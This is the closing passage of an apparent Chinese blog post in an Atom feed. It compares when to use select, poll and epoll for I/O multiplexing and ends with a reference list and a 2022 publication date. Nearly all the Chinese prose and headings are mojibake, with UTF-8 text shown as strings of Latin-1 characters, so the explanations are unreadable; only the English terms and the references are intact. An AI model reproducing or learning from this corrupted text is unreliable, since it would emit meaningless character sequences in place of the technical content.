<p>select çš„ timeout å‚æ•°ç²¾åº¦ä¸º 1nsï¼Œè€Œ poll å’Œ epoll ä¸º 1msï¼Œå› æ­¤ select æ›´åŠ é€‚ç”¨äºå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚æ ¸ååº”å †çš„æ§åˆ¶ã€‚</p>
<p>select å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå‡ ä¹è¢«æ‰€æœ‰ä¸»æµå¹³å°æ‰€æ”¯æŒã€‚</p>
<h3 id="_2-poll-åº”ç”¨åœºæ™¯" tabindex="-1"> 2. poll åº”ç”¨åœºæ™¯</h3>
<p>poll æ²¡æœ‰æœ€å¤§æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œå¦‚æœå¹³å°æ”¯æŒå¹¶ä¸”å¯¹å®æ—¶æ€§è¦æ±‚ä¸é«˜ï¼Œåº”è¯¥ä½¿ç”¨ poll è€Œä¸æ˜¯ selectã€‚</p>
<h3 id="_3-epoll-åº”ç”¨åœºæ™¯" tabindex="-1"> 3. epoll åº”ç”¨åœºæ™¯</h3>
<p>åªéœ€è¦è¿è¡Œåœ¨ Linux å¹³å°ä¸Šï¼Œæœ‰å¤§é‡çš„æè¿°ç¬¦éœ€è¦åŒæ—¶è½®è¯¢ï¼Œå¹¶ä¸”è¿™äº›è¿æ¥æœ€å¥½æ˜¯é•¿è¿æ¥ã€‚</p>
<p>éœ€è¦åŒæ—¶ç›‘æ§å°äº 1000 ä¸ªæè¿°ç¬¦ï¼Œå°±æ²¡æœ‰å¿…è¦ä½¿ç”¨ epollï¼Œå› ä¸ºè¿™ä¸ªåº”ç”¨åœºæ™¯ä¸‹å¹¶ä¸èƒ½ä½“ç° epoll çš„ä¼˜åŠ¿ã€‚</p>
<p>éœ€è¦ç›‘æ§çš„æè¿°ç¬¦çŠ¶æ€å˜åŒ–å¤šï¼Œè€Œä¸”éƒ½æ˜¯éå¸¸çŸ­æš‚çš„ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦ä½¿ç”¨ epollã€‚å› ä¸º epoll ä¸­çš„æ‰€æœ‰æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨å†…æ ¸ä¸­ï¼Œé€ æˆæ¯æ¬¡éœ€è¦å¯¹æè¿°ç¬¦çš„çŠ¶æ€æ”¹å˜éƒ½éœ€è¦é€šè¿‡ epoll_ctl() è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œé¢‘ç¹ç³»ç»Ÿè°ƒç”¨é™ä½æ•ˆç‡ã€‚å¹¶ä¸” epoll çš„æè¿°ç¬¦å­˜å‚¨åœ¨å†…æ ¸ï¼Œä¸å®¹æ˜“è°ƒè¯•ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004.</li>
<li>http://man7.org/linux/man-pages/man2/select.2.html</li>
<li>http://man7.org/linux/man-pages/man2/poll.2.html</li>
<li><a href="https://www.ibm.com/developerworks/linux/library/l-async/" target="_blank" rel="noopener noreferrer">Boost application performance using asynchronous I/O</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365683(v=vs.85).aspx" target="_blank" rel="noopener noreferrer">Synchronous and Asynchronous I/O</a></li>
<li><a href="https://segmentfault.com/a/1190000003063859" target="_blank" rel="noopener noreferrer">Linux IO æ¨¡å¼åŠ selectã€pollã€epoll è¯¦è§£</a></li>
<li><a href="https://daniel.haxx.se/docs/poll-vs-select.html" target="_blank" rel="noopener noreferrer">poll vs select vs event-based</a></li>
<li><a href="http://www.ulduzsoft.com/2014/01/select-poll-epoll-practical-difference-for-system-architects/" target="_blank" rel="noopener noreferrer">select / poll / epoll: practical difference for system architects</a></li>
<li><a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/" target="_blank" rel="noopener noreferrer">Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
</feed>